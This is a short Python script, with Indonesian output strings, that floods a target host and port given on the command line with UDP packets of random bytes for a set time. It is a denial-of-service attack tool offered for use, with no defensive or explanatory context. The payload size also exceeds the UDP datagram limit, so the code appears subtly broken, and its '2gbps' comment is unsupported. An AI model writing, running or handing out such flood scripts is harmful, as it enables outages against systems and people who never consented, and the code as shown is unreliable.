import sys
import socket
import time
import random

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(200000)
    timeout =  time.time() + duration
    sent = 0

    while time.time() < timeout:
        client.sendto(bytes, (victim, vport))
        sent += 1

    print("Selesai mengirim %s paket ke %s pada port %s" % (sent, victim, vport))
    client.close()

victim = sys.argv[1]
vport = int(sys.argv[2])
duration = int(sys.argv[3]) / 2  # durasi waktu untuk mengirim request 2gbps   
flood(victim, vport, duration)
